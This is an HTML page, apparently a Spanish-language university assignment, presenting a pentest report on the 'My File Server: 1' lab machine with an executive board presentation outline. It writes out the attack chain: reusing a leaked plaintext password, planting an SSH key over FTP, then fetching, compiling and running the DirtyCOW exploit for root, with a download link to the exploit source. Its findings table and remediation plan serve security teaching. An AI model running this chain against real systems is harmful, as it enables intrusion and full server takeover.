@@ -1,0 +1,624 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Actividad 13: Red Team Report - Pentesting My File Server 1 | Parcial 2</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../../css/style.css">
+
+<style>
+  /* Menú de navegación en columna vertical para parciales */
+  .site-nav .nav-list {
+    display: flex;
+    align-items: center;
+    gap: 18px;
+  }
+  .nav-column-item {
+    display: flex;
+    align-items: center;
+  }
+  .parciales-stack {
+    display: flex;
+    flex-direction: column;
+    gap: 3px;
+    padding: 5px 10px;
+    background: rgba(13, 17, 23, 0.65);
+    border-left: 2px solid var(--accent);
+    border-right: 1px solid var(--border);
+    border-radius: 4px;
+  }
+  .parciales-stack a {
+    font-family: var(--font-mono);
+    font-size: 0.75rem;
+    color: var(--text-muted);
+    line-height: 1.25;
+    transition: color 0.2s var(--ease), padding-left 0.2s var(--ease);
+    text-decoration: none;
+  }
+  .parciales-stack a:hover { color: var(--accent); padding-left: 3px; }
+  .parciales-stack a.is-active { color: var(--accent); font-weight: 700; }
+  .site-header.is-scrolled .parciales-stack { flex-direction: row; gap: 8px; padding: 3px 8px; }
+
+  /* Módulos de controles y definiciones */
+  .control-card-sub {
+    border-left: 2px solid var(--border);
+    padding-left: 18px;
+    margin-bottom: 20px;
+    transition: border-color 0.2s;
+  }
+  .control-card-sub:hover { border-left-color: var(--accent); }
+  .control-title {
+    font-family: var(--font-mono);
+    font-size: 0.95rem;
+    color: #fff;
+    font-weight: 700;
+    margin-bottom: 6px;
+  }
+
+  /* Tablas técnicas de hallazgos y matriz de riesgo */
+  .custom-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-family: var(--font-mono);
+    font-size: 0.85rem;
+    margin-top: 15px;
+  }
+  .custom-table th, .custom-table td {
+    padding: 12px 14px;
+    border: 1px solid var(--border);
+    text-align: left;
+  }
+  .custom-table th {
+    background: #090B10;
+    color: var(--accent);
+    font-weight: 700;
+  }
+  .custom-table tr:nth-child(even) {
+    background: rgba(255, 255, 255, 0.02);
+  }
+  .custom-table td {
+    color: var(--text);
+  }
+
+  /* Badges de severidad */
+  .badge-crit {
+    color: #ff4d4d;
+    background: rgba(255, 77, 77, 0.12);
+    border: 1px solid #ff4d4d;
+    padding: 3px 8px;
+    border-radius: 4px;
+    font-weight: 700;
+  }
+  .badge-high {
+    color: #ff944d;
+    background: rgba(255, 148, 77, 0.12);
+    border: 1px solid #ff944d;
+    padding: 3px 8px;
+    border-radius: 4px;
+    font-weight: 700;
+  }
+  .badge-med {
+    color: #ffd24d;
+    background: rgba(255, 210, 77, 0.12);
+    border: 1px solid #ffd24d;
+    padding: 3px 8px;
+    border-radius: 4px;
+    font-weight: 700;
+  }
+  .badge-low {
+    color: #4da6ff;
+    background: rgba(77, 166, 255, 0.12);
+    border: 1px solid #4da6ff;
+    padding: 3px 8px;
+    border-radius: 4px;
+    font-weight: 700;
+  }
+
+  /* Contenedores de evidencias gráficas */
+  .evidence-box {
+    border: 1px dashed var(--border);
+    padding: 20px;
+    text-align: center;
+    border-radius: 8px;
+    background: var(--bg);
+    margin-top: 20px;
+    margin-bottom: 24px;
+  }
+  .evidence-box img {
+    max-width: 100%;
+    height: auto;
+    border-radius: 4px;
+    border: 1px solid var(--border);
+    box-shadow: 0 4px 12px rgba(0,0,0,0.5);
+  }
+  .evidence-caption {
+    color: var(--text-muted);
+    font-size: 0.85rem;
+    margin-top: 12px;
+    font-family: var(--font-mono);
+  }
+</style>
+</head>
+<body>
+
+<a class="skip-link" href="#main">Saltar al contenido</a>
+
+<!-- ENCABEZADO FLOTANTE TIPO TERMINAL -->
+<header class="site-header">
+  <div class="header-inner">
+    <div class="identity">
+      <div class="terminal-prompt">
+        <span class="prompt-user">root@cno-iv</span><span class="prompt-char">:~$</span> cd /opt/parcial_2/act_13
+      </div>
+      <span class="identity-name">
+        Alejandro García Morales<span class="alias-green">[xXAGMXx]</span> <span class="blink-cursor">_</span>
+      </span>
+      <div class="identity-meta">
+        <span class="meta-item">> Asignatura: CNO IV (T37A) - Seguridad Informática</span>
+        <span class="meta-item">> Docente: Mtro. Servando López Contreras</span>
+        <span class="meta-item">> Institución: Universidad Politécnica de San Luis Potosí</span>
+        <span class="meta-item">> Periodo: Agosto - Diciembre 2026</span>
+      </div>
+    </div>
+
+    <nav class="site-nav" aria-label="Navegación principal">
+      <button type="button" class="nav-toggle" id="nav-toggle" aria-expanded="false" aria-controls="nav-list">
+        <span></span><span></span><span></span>
+        <span class="sr-only">Abrir menú</span>
+      </button>
+      <ul id="nav-list" class="nav-list">
+        <li><a href="../../index.html">/Inicio</a></li>
+        
+        <li class="nav-column-item">
+          <div class="parciales-stack">
+            <a href="../../parcial_1.html">> Parcial 1</a>
+            <a href="../../parcial_2.html" class="is-active">> Parcial 2</a>
+            <a href="#">> Parcial 3</a>
+          </div>
+        </li>
+
+        <li><a href="../../Proyectos/proyecto_1.html">/Proyectos</a></li>
+        <li><a href="../../hall_of_fame.html">/Hall of Fame</a></li>
+        <li><a href="#">/Certificados</a></li>
+      </ul>
+    </nav>
+  </div>
+</header>
+
+<main id="main">
+
+  <div style="margin-top: 40px;">
+    <!-- Botón de retorno al Parcial 2 -->
+    <a href="../../parcial_2.html" class="btn-action" style="border: none; padding: 0;">
+       &lt;- Volver al Parcial 2
+    </a>
+  </div>
+
+  <!-- [DOC_01] OBJETIVO Y FICHA TÉCNICA -->
+  <section class="row">
+    <div class="row-label">
+      <span class="row-index">[DOC_01]</span>
+      <h2>Ficha Técnica</h2>
+    </div>
+    <div class="row-content data-module">
+      <h3 class="activity-title" style="color: var(--accent);">Actividad 13: Red team report: pentesting de My File Server 1</h3>
+      <p class="lede">
+        Elaboración de un informe técnico profesional de pruebas de penetración (Red Team Report) y presentación directiva sobre el servidor vulnerable corporativo My File Server: 1, aplicando metodologías formales de evaluación de seguridad ofensiva.
+      </p>
+      
+      <div class="spec-grid" style="margin-top: 25px;">
+        <div class="spec-item">
+          <span class="spec-tag">OBJETIVO TÉCNICO</span>
+          <p style="font-size: 0.9rem; color: var(--text);">
+            Aplicar una metodología formal de pentesting (reconocimiento, enumeración, explotación y post-explotación) para identificar vectores de ataque, documentar hallazgos críticos y elaborar propuestas de mitigación con evaluación del modelo CIA.
+          </p>
+        </div>
+        <div class="spec-item">
+          <span class="spec-tag">ENTORNO AUDITADO</span>
+          <p style="font-size: 0.9rem; color: var(--text);">
+            <strong>Objetivo:</strong> My File Server: 1<br>
+            <strong>Atacante:</strong> Kali Linux<br>
+            <strong>Metodología:</strong> PTES / OWASP
+          </p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- [EXEC_02] RESUMEN EJECUTIVO -->
+  <section class="row">
+    <div class="row-label">
+      <span class="row-index">[EXEC_02]</span>
+      <h2>Resumen Ejecutivo</h2>
+    </div>
+    <div class="row-content data-module">
+      <h4 style="color: #fff; font-size: 1.1rem; margin-bottom: 12px;">Evaluación de Postura de Seguridad</h4>
+      <p style="color: var(--text-muted); margin-bottom: 20px;">
+        Durante el ejercicio de seguridad ofensiva tipo Black-box sobre el servidor corporativo de almacenamiento de archivos <strong>My File Server: 1</strong>, el equipo auditor identificó una cadena crítica de debilidades que permitió comprometer el sistema de manera integral, alcanzando privilegios de superusuario (<code style="color: var(--accent);">root</code>) sin contar con credenciales iniciales.
+      </p>
+
+      <div class="control-card-sub">
+        <div class="control-title">Diagnóstico General del Nivel de Riesgo: CRÍTICO (9.8 / 10)</div>
+        <p style="font-size: 0.85rem; color: var(--text-muted); margin-bottom: 10px;">
+          El activo presenta una combinación severa de negligencia operativa básica (exposición de credenciales de usuario en texto plano en la raíz del servidor web) y obsolescencia tecnológica no gestionada (kernel de Linux desactualizado desde el año 2015 susceptible al exploit de condición de carrera DirtyCOW).
+        </p>
+        <p style="font-size: 0.85rem; color: var(--text-muted);">
+          Un adversario externo con acceso a la red local puede tomar control total del servidor en menos de dos horas, teniendo la capacidad de extraer archivos de usuarios, exfiltrar bases de datos, inyectar ransomware o destruir permanentemente el almacenamiento corporativo.
+        </p>
+      </div>
+    </div>
+  </section>
+
+  <!-- [RECON_03] FASE DE RECONOCIMIENTO Y ENUMERACIÓN -->
+  <section class="row">
+    <div class="row-label">
+      <span class="row-index">[RECON_03]</span>
+      <h2>Enumeración</h2>
+    </div>
+    <div class="row-content data-module">
+      <h4 style="color: #fff; font-size: 1.1rem; margin-bottom: 12px;">Descubrimiento de Red y Mapeo de Servicios</h4>
+      <p style="color: var(--text-muted); margin-bottom: 15px;">
+        La fase inicial de reconocimiento pasivo y activo permitió ubicar el objetivo dentro del segmento mediante peticiones ARP con <code>netdiscover</code>, identificando la IP <code>192.168.1.154</code> con dirección MAC <code>08:00:27:56:2f:71</code>.
+      </p>
+
+      <div class="code-window" style="margin-bottom: 20px;">
+        <div class="code-header">
+          <div class="code-dots">
+            <span class="dot close"></span>
+            <span class="dot minimize"></span>
+            <span class="dot maximize"></span>
+          </div>
+          <div class="code-title">terminal — Escaneo de puertos y servicios con Nmap</div>
+        </div>
+        <div class="code-body">
+<pre><code><span class="prompt-user">kali@kali</span>:<span class="prompt-char">~$</span> nmap -p- 192.168.1.154 -sV
+PORT     STATE SERVICE      VERSION
+21/tcp   open  ftp          vsftpd 3.0.2 (Anonymous allowed)
+22/tcp   open  ssh          OpenSSH 7.4 (protocol 2.0)
+80/tcp   open  http         Apache httpd 2.4.6 ((CentOS))
+111/tcp  open  rpcbind      2-4 (RPC #100000)
+445/tcp  open  microsoft-ds Samba smbd 4.9.1
+2049/tcp open  nfs          nfs_acl 3
+2121/tcp open  ccproxy-ftp  ProFTPD 1.3.5 (Anonymous allowed)</code></pre>
+        </div>
+      </div>
+
+      <div class="control-card-sub">
+        <div class="control-title">Hallazgos en Servicios SMB y Servidor Web</div>
+        <ul class="tag-list" style="gap: 10px; margin-top: 10px;">
+          <li><strong style="color: var(--accent);">> Recursos SMB (smbmap):</strong> Detección del usuario <code>smbuser</code> con permisos abiertos de lectura y escritura (<code>READ, WRITE</code>) en los recursos compartidos <code>smbdata</code> y <code>smbuser</code>.</li>
+          <li><strong style="color: var(--accent);">> Fuga Web (Nikto):</strong> El escáner web reveló la presencia del archivo <code>http://192.168.1.154/readme.txt</code>, el cual contenía en texto claro: <em>"My Password is rootroot1"</em>.</li>
+        </ul>
+      </div>
+
+      <div class="evidence-box">
+        <img src="Archivos/Actividad_13/evidencia_recon.png" alt="Evidencia de reconocimiento y fuga en readme.txt">
+        <p class="evidence-caption">>_ Evidencia 01: Identificación de servicios abiertos en Nmap y fuga de credenciales en el archivo /readme.txt.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- [EXPLOIT_04] EXPLOTACIÓN Y ACCESO INICIAL -->
+  <section class="row">
+    <div class="row-label">
+      <span class="row-index">[EXPLOIT_04]</span>
+      <h2>Explotación</h2>
+    </div>
+    <div class="row-content data-module">
+      <h4 style="color: #fff; font-size: 1.1rem; margin-bottom: 12px;">Acceso Inicial e Inyección de Llave SSH vía FTP</h4>
+      <p style="color: var(--text-muted); margin-bottom: 15px;">
+        Combinando el usuario obtenido de Samba (<code>smbuser</code>) y la credencial expuesta en el servidor HTTP (<code>rootroot1</code>), se estableció sesión en el servicio vsftpd (puerto 21). Debido a una configuración de permisos débiles en la raíz del usuario, fue posible implantar persistencia cargando una llave SSH pública.
+      </p>
+
+      <div class="code-window" style="margin-bottom: 20px;">
+        <div class="code-header">
+          <div class="code-dots">
+            <span class="dot close"></span>
+            <span class="dot minimize"></span>
+            <span class="dot maximize"></span>
+          </div>
+          <div class="code-title">terminal — Sesión FTP e implantación de authorized_keys</div>
+        </div>
+        <div class="code-body">
+<pre><code><span class="prompt-user">ftp></span> pwd
+Remote directory: /home/smbuser
+<span class="prompt-user">ftp></span> mkdir .ssh
+257 "/home/smbuser/.ssh" created
+<span class="prompt-user">ftp></span> cd .ssh
+250 Directory successfully changed.
+<span class="prompt-user">ftp></span> put /root/.ssh/id_rsa.pub authorized_keys
+226 Transfer complete. 563 bytes sent in 00:00 (11.42 MiB/s)</code></pre>
+        </div>
+      </div>
+
+      <p style="color: var(--text-muted); margin-bottom: 15px;">
+        Con la clave pública inyectada, se obtuvo acceso directo mediante Secure Shell ejecutando <code>ssh smbuser@192.168.1.154</code>, accediendo a una consola interactiva sin contraseña como usuario con privilegios estándar.
+      </p>
+
+      <div class="evidence-box">
+        <img src="Archivos/Actividad_13/evidencia_ssh.png" alt="Acceso inicial vía SSH">
+        <p class="evidence-caption">>_ Evidencia 02: Acceso por consola al servidor My File Server 1 como usuario smbuser tras autenticación por clave RSA.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- [PRIVESC_05] ESCALADA DE PRIVILEGIOS -->
+  <section class="row">
+    <div class="row-label">
+      <span class="row-index">[PRIVESC_05]</span>
+      <h2>Escalada</h2>
+    </div>
+    <div class="row-content data-module">
+      <h4 style="color: #fff; font-size: 1.1rem; margin-bottom: 12px;">Compromiso Total mediante DirtyCOW (CVE-2016-5195)</h4>
+      <p style="color: var(--text-muted); margin-bottom: 15px;">
+        Al inspeccionar el sistema operativo con <code>uname -a</code>, se constató la presencia del kernel <code>Linux fileserver 3.10.0-229.el7.x86_64</code> (compilado en marzo de 2015). Esta versión presenta una condición de carrera crítica en el manejo de la copia en escritura (<em>Copy-On-Write</em>) de páginas de memoria de solo lectura.
+      </p>
+
+      <div class="code-window" style="margin-bottom: 20px;">
+        <div class="code-header">
+          <div class="code-dots">
+            <span class="dot close"></span>
+            <span class="dot minimize"></span>
+            <span class="dot maximize"></span>
+          </div>
+          <div class="code-title">terminal — Compilación y ejecución del exploit DirtyCOW</div>
+        </div>
+        <div class="code-body">
+<pre><code><span class="prompt-user">[smbuser@fileserver ~]$</span> wget http://192.168.1.64:8080/40616.c
+<span class="prompt-user">[smbuser@fileserver ~]$</span> gcc 40616.c -o upslp -pthread
+<span class="prompt-user">[smbuser@fileserver ~]$</span> ./upslp
+DirtyCow root privilege escalation
+Backing up /usr/bin/passwd.. to /tmp/bak
+Size of binary: 27832
+Racing, this may take a while..
+/usr/bin/passwd is overwritten
+Popping root shell.
+<span class="prompt-user">[root@fileserver smbuser]#</span> whoami
+root
+<span class="prompt-user">[root@fileserver smbuser]#</span> cd /root && cat proof.txt</code></pre>
+        </div>
+      </div>
+
+      <div class="evidence-box">
+        <img src="Archivos/Actividad_13/evidencia_root.png" alt="Obtención de shell root con DirtyCOW">
+        <p class="evidence-caption">>_ Evidencia 03: Escalada de privilegios a root mediante DirtyCOW y lectura de la bandera de auditoría proof.txt.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- [CIA_06] ANÁLISIS DE IMPACTO MODELO CIA -->
+  <section class="row">
+    <div class="row-label">
+      <span class="row-index">[CIA_06]</span>
+      <h2>Impacto CIA</h2>
+    </div>
+    <div class="row-content data-module">
+      <h4 style="color: #fff; font-size: 1.1rem; margin-bottom: 15px;">Evaluación de Impacto en la Tríada de Seguridad</h4>
+
+      <div class="control-card-sub">
+        <div class="control-title">Confidencialidad: Pérdida Total (100%)</div>
+        <p style="font-size: 0.85rem; color: var(--text-muted);">
+          Al poseer control del superusuario <code style="color: var(--accent);">root</code>, el atacante tiene lectura directa e irrestricta de archivos confidenciales del sistema operativo (<code style="color: var(--text);">/etc/shadow</code>), claves criptográficas, certificados corporativos y todos los documentos alojados en los recursos compartidos de Samba.
+        </p>
+      </div>
+
+      <div class="control-card-sub">
+        <div class="control-title">Integridad: Pérdida Total (100%)</div>
+        <p style="font-size: 0.85rem; color: var(--text-muted);">
+          El adversario puede modificar y sustituir binarios del sistema (como se evidenció con <code style="color: var(--text);">/usr/bin/passwd</code>), manipular registros contables, alterar archivos de configuración y eliminar o falsificar registros en los archivos de log (<code style="color: var(--text);">/var/log/</code>) para ocultar cualquier rastro de la intrusión.
+        </p>
+      </div>
+
+      <div class="control-card-sub">
+        <div class="control-title">Disponibilidad: Pérdida Total (100%)</div>
+        <p style="font-size: 0.85rem; color: var(--text-muted);">
+          El atacante posee facultades para denegar el servicio apagando la máquina, cifrando todos los archivos corporativos mediante ransomware, deshabilitando el demonio de red o borrando de forma irrecuperable los volúmenes lógicos de almacenamiento.
+        </p>
+      </div>
+    </div>
+  </section>
+
+  <!-- [FINDINGS_07] TABLA DE HALLAZGOS -->
+  <section class="row">
+    <div class="row-label">
+      <span class="row-index">[FINDINGS_07]</span>
+      <h2>Hallazgos</h2>
+    </div>
+    <div class="row-content data-module">
+      <h4 style="color: #fff; font-size: 1.1rem; margin-bottom: 12px;">Tabla Consolidada de Vulnerabilidades</h4>
+      
+      <table class="custom-table">
+        <thead>
+          <tr>
+            <th>ID</th>
+            <th>Vulnerabilidad</th>
+            <th>Severidad</th>
+            <th>Evidencia</th>
+            <th>Impacto</th>
+            <th>Recomendación</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><strong>SEC-01</strong></td>
+            <td>Kernel Linux vulnerable a DirtyCOW (CVE-2016-5195)</td>
+            <td><span class="badge-crit">Crítica</span></td>
+            <td>Ejecución de binario <code>40616.c</code> que sobrescribe <code>/usr/bin/passwd</code> y otorga UID 0.</td>
+            <td>Toma de control total del servidor y escalada local inmediata a superusuario.</td>
+            <td>Actualizar y parchar el kernel de CentOS 7 a una versión mantenida y protegida.</td>
+          </tr>
+          <tr>
+            <td><strong>SEC-02</strong></td>
+            <td>Fuga de credenciales en texto plano (readme.txt)</td>
+            <td><span class="badge-high">Alta</span></td>
+            <td>Petición HTTP a <code>/readme.txt</code> que expone contraseña de <code>smbuser</code>.</td>
+            <td>Permite acceso inicial válido a usuarios sin privilegios ni autenticación previa.</td>
+            <td>Eliminar archivos con contraseñas del directorio raíz web e implementar políticas estrictas.</td>
+          </tr>
+          <tr>
+            <td><strong>SEC-03</strong></td>
+            <td>Permisos permisivos en directorio de usuario vía FTP</td>
+            <td><span class="badge-high">Alta</span></td>
+            <td>Carga de archivo <code>authorized_keys</code> en <code>/home/smbuser/.ssh</code> mediante FTP.</td>
+            <td>Persistencia y escalada de vector remoto sin control mediante sesiones SSH directas.</td>
+            <td>Enjaular usuarios FTP (chroot) y restringir permisos de escritura sobre carpetas ocultas.</td>
+          </tr>
+          <tr>
+            <td><strong>SEC-04</strong></td>
+            <td>Recursos compartidos SMB con lectura y escritura abierta</td>
+            <td><span class="badge-med">Media</span></td>
+            <td><code>smbmap</code> identifica <code>READ, WRITE</code> en <code>smbdata</code> y <code>smbuser</code>.</td>
+            <td>Acceso no autorizado y posible manipulación de datos departamentales en tránsito.</td>
+            <td>Configurar listas de control de acceso (ACL) y exigir firma de paquetes SMB.</td>
+          </tr>
+          <tr>
+            <td><strong>SEC-05</strong></td>
+            <td>Servicios redundantes y método HTTP TRACE habilitado</td>
+            <td><span class="badge-low">Baja</span></td>
+            <td>ProFTPD en puerto 2121 y Apache con método TRACE activo detectado por Nikto.</td>
+            <td>Ampliación innecesaria de la superficie de ataque y posible vector de XST.</td>
+            <td>Desinstalar servicios duplicados y agregar <code>TraceEnable Off</code> en la configuración de Apache.</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- [BOARD_08] PRESENTACIÓN PARA EL CONSEJO DIRECTIVO -->
+  <section class="row">
+    <div class="row-label">
+      <span class="row-index">[BOARD_08]</span>
+      <h2>Presentación Directiva</h2>
+    </div>
+    <div class="row-content data-module">
+      <h4 style="color: #fff; font-size: 1.1rem; margin-bottom: 12px;">Estructura de la Presentación Ejecutiva (10 Diapositivas)</h4>
+      <p style="color: var(--text-muted); margin-bottom: 20px;">
+        Diseño estratégico orientado al Consejo Directivo enfocado en riesgo de negocio, continuidad de operaciones y retorno de inversión en ciberseguridad:
+      </p>
+
+      <div class="control-card-sub">
+        <div class="control-title">Slide 01: Portada Corporativa</div>
+        <p style="font-size: 0.85rem; color: var(--text-muted);">
+          <strong>Título:</strong> Informe de Evaluación de Ciberseguridad Ofensiva — My File Server 1.<br>
+          <strong>Audiencia:</strong> Consejo Directivo y Dirección General de Tecnologías de Información.
+        </p>
+      </div>
+
+      <div class="control-card-sub">
+        <div class="control-title">Slide 02: Contexto del Engagement</div>
+        <p style="font-size: 0.85rem; color: var(--text-muted);">
+          Simulación de adversario real (Red Team) sin credenciales previas para determinar la resiliencia del servidor central de almacenamiento de la empresa.
+        </p>
+      </div>
+
+      <div class="control-card-sub">
+        <div class="control-title">Slide 03: Metodología Aplicada</div>
+        <p style="font-size: 0.85rem; color: var(--text-muted);">
+          Marco estandarizado PTES: Evaluación perimetral, Análisis de exposición, Explotación ética y Verificación de impacto en operaciones.
+        </p>
+      </div>
+
+      <div class="control-card-sub">
+        <div class="control-title">Slide 04: Nivel General del Riesgo</div>
+        <p style="font-size: 0.85rem; color: var(--text-muted);">
+          Diagnóstico: <strong>Riesgo Crítico</strong>. Un atacante logró el compromiso total del sistema en menos de dos horas de prueba.
+        </p>
+      </div>
+
+      <div class="control-card-sub">
+        <div class="control-title">Slide 05: Hallazgos Críticos de Alto Impacto</div>
+        <p style="font-size: 0.85rem; color: var(--text-muted);">
+          1) Credenciales de red expuestas en documento de texto público.<br>
+          2) Servicios de transferencia de archivos con permisos permisivos de escritura.<br>
+          3) Sistema operativo desactualizado con fallo crítico de elevación de privilegios.
+        </p>
+      </div>
+
+      <div class="control-card-sub">
+        <div class="control-title">Slide 06: Escenario de Impacto en Negocio</div>
+        <p style="font-size: 0.85rem; color: var(--text-muted);">
+          Pérdida potencial de contratos por fuga de archivos confidenciales, multas regulatorias por incumplimiento en protección de datos personales y paro total de operaciones ante incidentes de ransomware.
+        </p>
+      </div>
+
+      <div class="control-card-sub">
+        <div class="control-title">Slide 07: Matriz de Riesgo Corporativo</div>
+        <p style="font-size: 0.85rem; color: var(--text-muted);">
+          Intersección entre Probabilidad Muy Alta (herramientas de escaneo accesibles públicamente) e Impacto Catastrófico (compromiso total de la tríada CIA). Cuadrante rojo de atención inmediata.
+        </p>
+      </div>
+
+      <div class="control-card-sub">
+        <div class="control-title">Slide 08: Recomendaciones Estratégicas</div>
+        <p style="font-size: 0.85rem; color: var(--text-muted);">
+          Adopción del principio de privilegios mínimos, implementación de programas de parches continuos y segmentación perimetral de servicios de almacenamiento.
+        </p>
+      </div>
+
+      <div class="control-card-sub">
+        <div class="control-title">Slide 09: Roadmap de Remediación Priorizado</div>
+        <p style="font-size: 0.85rem; color: var(--text-muted);">
+          <strong>Fase 1 (Inmediata / 24-48 hrs):</strong> Retirar archivos con contraseñas y cerrar puertos duplicados (2121).<br>
+          <strong>Fase 2 (Corto Plazo / 1-2 semanas):</strong> Actualizar kernel del servidor y restringir permisos de escritura en Samba.<br>
+          <strong>Fase 3 (Mediano Plazo / 1 mes):</strong> Implementar autenticación multifactor (MFA) y monitoreo de logs centralizado.
+        </p>
+      </div>
+
+      <div class="control-card-sub">
+        <div class="control-title">Slide 10: Conclusión Ejecutiva</div>
+        <p style="font-size: 0.85rem; color: var(--text-muted);">
+          El activo presenta vulnerabilidades severas que no requieren renovación costosa de equipamiento, sino la aplicación de buenas prácticas de endurecimiento (<em>hardening</em>) y actualización periódica de software.
+        </p>
+      </div>
+    </div>
+  </section>
+
+  <!-- [DWN_09] RECURSOS DE DESCARGA -->
+  <section class="row">
+    <div class="row-label">
+      <span class="row-index">[DWN_09]</span>
+      <h2>Recursos</h2>
+    </div>
+    <div class="row-content">
+      
+      <div class="downloads-grid" style="margin-bottom: 30px;">
+        <!-- Informe Completo PDF -->
+        <a href="Archivos/Actividad_13/Reporte_Pentesting_Act13.pdf" download class="download-card">
+          <div class="dl-icon">[PDF]</div>
+          <span class="dl-title">Informe Técnico Pentesting</span>
+          <span class="dl-meta">Reporte_Pentesting_Act13.pdf</span>
+        </a>
+
+        <!-- Presentación Ejecutiva PDF -->
+        <a href="Archivos/Actividad_13/Presentacion_Directiva_Act13.pdf" download class="download-card">
+          <div class="dl-icon">[PPT]</div>
+          <span class="dl-title">Presentación Consejo Directivo</span>
+          <span class="dl-meta">Presentacion_Directiva_Act13.pdf</span>
+        </a>
+
+        <!-- Exploit / Código DirtyCOW -->
+        <a href="Archivos/Actividad_13/40616.c" download class="download-card">
+          <div class="dl-icon">[/]</div>
+          <span class="dl-title">Código Exploit (DirtyCOW)</span>
+          <span class="dl-meta">40616.c</span>
+        </a>
+      </div>
+
+    </div>
+  </section>
+  
+</main>
+
+<footer class="site-footer">
+  <div class="footer-inner">
+    <p>© 2026 Alejandro García Morales. Todos los derechos reservados.</p>
+    <p>CNO IV (T37A) — Seguridad Informática | UPSLP</p>
+  </div>
+</footer>
+
+<script src="../../js/main.js"></script>
+</body>
+</html>
